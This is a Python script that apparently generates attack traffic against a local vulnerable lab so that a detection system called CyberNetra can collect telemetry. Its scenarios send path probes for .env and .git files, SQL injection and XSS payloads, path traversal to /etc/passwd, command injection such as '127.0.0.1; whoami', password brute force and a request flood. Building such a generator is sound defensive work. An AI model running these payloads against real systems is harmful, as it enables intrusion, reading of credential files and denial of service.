"""
CyberNetra Controlled Vulnerable Lab — Automated Attack Simulation Runner
Simulates multi-stage attacker behavior (Recon, Brute Force, Exploits, DoS)
to generate realistic security telemetry for CyberNetra AI.
"""

import sys
import time
import argparse
import requests

DEFAULT_TARGET = "http://127.0.0.1:9000"

def print_banner():
    print("=" * 70)
    print("  CYBERNETRA VULNERABLE LAB — ATTACK TRAFFIC GENERATOR")
    print("=" * 70)

def test_health(base_url):
    try:
        r = requests.get(f"{base_url}/health", timeout=3)
        return r.status_code == 200
    except Exception:
        return False

def run_normal_traffic(base_url):
    print("\n[+] [Scenario 1: Normal Browsing Baseline]")
    endpoints = ["/", "/search?q=vpn", "/api/products", "/api/users", "/health"]
    for ep in endpoints:
        url = f"{base_url}{ep}"
        res = requests.get(url)
        print(f"    GET {ep:<25} -> Status: {res.status_code}")
        time.sleep(0.1)

def run_recon_scan(base_url):
    print("\n[+] [Scenario 2: Reconnaissance & Sensitive Path Probing (MITRE T1046)]")
    scan_paths = [
        "/.env", "/wp-admin", "/phpmyadmin", "/.git/config",
        "/admin/backup", "/config.php", "/server-status"
    ]
    for path in scan_paths:
        url = f"{base_url}{path}"
        res = requests.get(url)
        print(f"    Probe: {path:<20} -> Status: {res.status_code} [Captured as T1046]")
        time.sleep(0.1)

def run_sqli_attacks(base_url):
    print("\n[+] [Scenario 3: SQL Injection Exploitation (MITRE T1190)]")
    sqli_payloads = [
        ("GET", f"{base_url}/search?q=' OR 1=1 --"),
        ("GET", f"{base_url}/api/users?search=' UNION SELECT 1,2,3,4 --"),
        ("POST_FORM", f"{base_url}/auth/login", {"username": "admin' OR '1'='1", "password": "password"})
    ]
    for method, url, *data in sqli_payloads:
        if method == "GET":
            res = requests.get(url)
            print(f"    SQLi GET: {url.split('?')[1]:<35} -> Status: {res.status_code}")
        else:
            res = requests.post(url, data=data[0])
            print(f"    SQLi Auth Bypass: username={data[0]['username']:<20} -> Status: {res.status_code}")
        time.sleep(0.1)

def run_xss_attacks(base_url):
    print("\n[+] [Scenario 4: Cross-Site Scripting (XSS) Payloads (MITRE T1059.007)]")
    # Reflected XSS
    url = f"{base_url}/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
    res = requests.get(url)
    print(f"    Reflected XSS: <script>alert(1)</script> -> Status: {res.status_code}")
    
    # Stored XSS via feedback
    res2 = requests.post(f"{base_url}/feedback", data={
        "author": "Attacker<img src=x onerror=alert('pwned')>",
        "comment": "Session stealing probe payload"
    })
    print(f"    Stored XSS: img onerror probe -> Status: {res2.status_code}")

def run_path_traversal(base_url):
    print("\n[+] [Scenario 5: Directory / Path Traversal (MITRE T1083)]")
    traversal_files = ["../../etc/passwd", "..\\..\\windows\\system32\\win.ini", "../../app/main.py"]
    for f in traversal_files:
        url = f"{base_url}/api/logs/view?file={f}"
        res = requests.get(url)
        print(f"    Traversal: {f:<35} -> Status: {res.status_code}")
        time.sleep(0.1)

def run_cmd_injection(base_url):
    print("\n[+] [Scenario 6: Remote OS Command Injection (MITRE T1059)]")
    payloads = [
        "127.0.0.1; whoami",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | uname -a"
    ]
    for p in payloads:
        res = requests.post(f"{base_url}/api/tools/ping", json={"host": p})
        print(f"    CMD Injection: host='{p}' -> Status: {res.status_code}")
        time.sleep(0.1)

def run_brute_force(base_url, attempts=8):
    print(f"\n[+] [Scenario 7: Distributed Credential Brute-Force (MITRE T1110) - {attempts} attempts]")
    passwords = ["123456", "password", "admin", "welcome", "qwerty", "login", "secret", "guest"]
    for idx, pwd in enumerate(passwords[:attempts], 1):
        res = requests.post(f"{base_url}/auth/login", data={"username": "admin", "password": pwd})
        print(f"    Auth Attempt {idx:02d}: user=admin pass={pwd:<10} -> Status: {res.status_code} (Failed)")
        time.sleep(0.1)

def run_rate_flood(base_url, count=30):
    print(f"\n[+] [Scenario 8: Volumetric Request Flood / DoS (MITRE T1498) - {count} requests]")
    for i in range(count):
        res = requests.get(f"{base_url}/api/resource-intensive?workload=5000")
        if i % 10 == 0 or i == count - 1:
            print(f"    Flood Progress: {i+1}/{count} requests completed (Status: {res.status_code})")
        time.sleep(0.02)


def main():
    parser = argparse.ArgumentParser(description="CyberNetra Vulnerable Lab Attack Generator")
    parser.add_argument("--url", default=DEFAULT_TARGET, help="Base URL of Vulnerable Lab (default: http://127.0.0.1:9000)")
    parser.add_argument("--scenario", default="all", choices=["all", "normal", "recon", "sqli", "xss", "traversal", "cmd", "brute", "dos"], help="Scenario to execute")
    args = parser.parse_args()

    print_banner()
    print(f"[*] Target Lab: {args.url}")
    print("[*] Checking lab availability...")

    if not test_health(args.url):
        print(f"[-] ERROR: Vulnerable lab is not responding at {args.url}.")
        print("    Please start the lab first:")
        print("    python -m uvicorn app.main:app --host 127.0.0.1 --port 9000")
        sys.exit(1)

    print("[+] Vulnerable lab is ONLINE and ready!\n")
    start_time = time.time()

    if args.scenario in ("all", "normal"):
        run_normal_traffic(args.url)
    if args.scenario in ("all", "recon"):
        run_recon_scan(args.url)
    if args.scenario in ("all", "sqli"):
        run_sqli_attacks(args.url)
    if args.scenario in ("all", "xss"):
        run_xss_attacks(args.url)
    if args.scenario in ("all", "traversal"):
        run_path_traversal(args.url)
    if args.scenario in ("all", "cmd"):
        run_cmd_injection(args.url)
    if args.scenario in ("all", "brute"):
        run_brute_force(args.url)
    if args.scenario in ("all", "dos"):
        run_rate_flood(args.url)

    elapsed = round(time.time() - start_time, 2)
    print("\n" + "=" * 70)
    print(f"[+] Attack simulation completed in {elapsed}s.")
    print("    Security telemetry has been recorded to: vulnerable_lab/logs/access.log")
    print("    To stream logs into CyberNetra AI, run:")
    print("    python vulnerable_lab/send_logs.py")
    print("=" * 70)

if __name__ == "__main__":
    main()
